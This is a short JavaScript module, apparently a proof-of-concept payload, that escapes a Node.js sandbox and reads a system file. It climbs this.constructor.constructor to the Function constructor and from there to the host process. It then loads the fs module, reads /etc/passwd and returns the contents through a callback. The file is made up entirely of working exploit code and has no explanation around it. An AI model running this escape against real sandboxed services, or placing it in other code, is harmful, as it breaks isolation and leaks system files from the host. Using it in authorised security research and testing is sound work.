const globalFunc = this.constructor.constructor;

const hostProcess = globalFunc('return process')();

const fs = hostProcess.mainModule.require('fs');
const secret = fs.readFileSync('/etc/passwd', 'utf8');

module.exports = function (cb) {
    cb(null, `Output: ${secret}`)
}
